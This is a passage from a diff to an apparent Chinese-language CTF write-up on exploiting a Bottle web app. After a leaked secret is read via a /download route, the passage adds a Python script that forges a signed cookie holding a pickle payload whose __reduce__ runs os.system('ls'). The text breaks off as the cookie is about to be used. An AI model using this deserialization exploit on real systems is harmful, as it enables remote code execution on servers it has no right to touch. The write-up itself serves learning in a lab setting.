@@ -110,3 +110,34 @@ with open('../../secret.txt', 'r') as f:
 我们可以通过`/download`路由去查看它
 ![500](assets/bottle模板注入/file-20251215193553299.png)
 拿到了密钥。
+然后通过http服务来伪造cookie
+```python
+# cookie.py
+from bottle import route, run,response
+import os
+
+
+secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"
+
+class exp():
+    def __reduce__(self):
+        cmd = "ls"
+        return (os.system, (cmd,))
+
+
+@route("/sign")
+def index():
+    try:
+        session = exp()
+        response.set_cookie("name", session, secret=secret)
+        return "success"
+    except:
+        return "pls no hax"
+
+
+if __name__ == "__main__":
+    os.chdir(os.path.dirname(__file__))
+    run(host="0.0.0.0", port=8081)
+
+```
+得到cookie后使用并访问`/secret `路由，
